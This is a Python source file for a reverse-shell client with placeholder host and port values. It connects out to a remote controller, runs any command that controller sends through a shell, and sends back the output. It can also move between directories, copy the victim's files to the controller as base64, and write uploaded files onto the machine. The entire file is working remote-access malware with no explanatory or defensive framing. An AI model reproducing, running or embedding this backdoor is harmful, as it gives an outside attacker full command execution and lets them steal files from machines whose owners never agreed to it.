import socket
import subprocess
import requests
import os
import json
import base64

HOST, PORT = str('{HOST}'), int({PORT})

def json_send(data, s):
        
        json_dump = json.dumps(data.decode())
        s.send(json_dump.encode())
    
def json_recv(s):

    data = ''
    
    while True:
        
        try:
            
            data = data + s.recv(1024).decode()
            data = json.loads(data.encode())
            return data.encode()
        
        except ValueError:
            
            continue
        
def change_directory(command):
    
    command = command.decode()    
    os.chdir(command[3:])
    return_msg = '\nCurrent Dir : ' + os.getcwd() + '\n'
    return return_msg.encode()

def main():
    
    s = socket.socket()

    # s.settimeout(15)
    
    s.connect((HOST, PORT))
        
    while True:
        
        command = json_recv(s)
        
        if(command.decode() == 'KILL'):
            
            s.close()
            raise SystemExit
        
        elif(command.decode() == 'clearstr'):
            
            json_send('~'.encode(), s)

        elif(command[:2].decode() == 'cd'):
            
            json_send(change_directory(command), s)
            
        elif(command[:8].decode() == 'download'):
            
            with open(command[9:], 'rb') as f:
                
                content = f.read()
                base64_data = base64.b64encode(content)
                json_send(base64_data, s)
                
        elif(command[:6].decode() == 'upload'):
            
            with open(command[7:], 'wb') as f:
                
                content = json_recv(s)
                base64_encode_data = base64.b64decode(content)
                f.write(base64_encode_data)

        else:
            
            proc = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            try:

                result = proc.stdout.read().decode() + proc.stderr.read().decode()
                json_send(result.encode(), s)
                
            except UnicodeDecodeError:
                
                json_send('\nError Decoding stdout and stderr from subprocess output\n'.encode(), s)

if __name__ == '__main__':
    
    main()